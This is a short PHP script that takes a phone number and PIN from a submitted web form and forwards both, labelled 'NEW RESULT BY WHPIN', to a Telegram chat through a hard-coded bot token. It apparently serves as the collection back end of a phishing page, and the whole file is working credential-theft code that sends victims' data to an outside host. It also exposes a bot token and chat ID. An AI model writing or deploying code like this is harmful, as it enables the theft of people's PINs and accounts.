<?php 

	use Telegram\Bot\Api;
	require_once('vendor/autoload.php');

	$num = $_POST["num"];
	$pin = $_POST["pin"];

	$message =  "NEW RESULT BY WHPIN"."\r\n"."==================="."\r\n"."Numéro : ".$num;
	$message2 = "PIN : ".$pin;



	$telegram = new Api('6444981398:AAE3DPRmQhuvNaNJdymkmQEmk5mOAQTgxPc');
		$response = $telegram->sendMessage([
		    'chat_id' => '6116176179', 
		    'text' => $message."\r\n".$message2
		]);





 ?>